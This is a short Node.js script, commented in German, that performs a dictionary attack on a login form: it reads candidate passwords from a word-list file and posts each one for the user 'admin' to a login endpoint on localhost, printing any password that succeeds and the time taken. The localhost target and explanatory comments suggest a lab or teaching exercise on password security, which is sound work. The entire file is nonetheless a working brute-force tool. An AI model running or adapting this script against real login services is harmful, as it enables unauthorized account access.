const fs = require("fs");

const username = "admin";

// Schickt einen einzelnen Login-Versuch, true = Treffer
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  return response.status === 200;
}

async function dictionaryAttack() {
  const start = Date.now();

  // Wörterbuch einlesen und in einzelne Zeilen zerlegen
  const content = fs.readFileSync("data/dictionary.txt", "utf8");
  const words = content
    .split(/\r?\n/)        // funktioniert für Windows (\r\n) und Linux (\n)
    .map((word) => word.trim()) // Leerzeichen/Zeilenreste entfernen
    .filter((word) => word.length > 0); // leere Zeilen rauswerfen

  console.log("Probiere", words.length, "Wörter ...");

  for (const word of words) {
    const found = await tryLogin(username, word);
    if (found) {
      const seconds = (Date.now() - start) / 1000;
      console.log("Passwort gefunden:", word);
      console.log("Dauer:", seconds, "Sekunden");
      return;
    }
  }

  console.log("Kein Passwort im Wörterbuch gefunden.");
}

dictionaryAttack();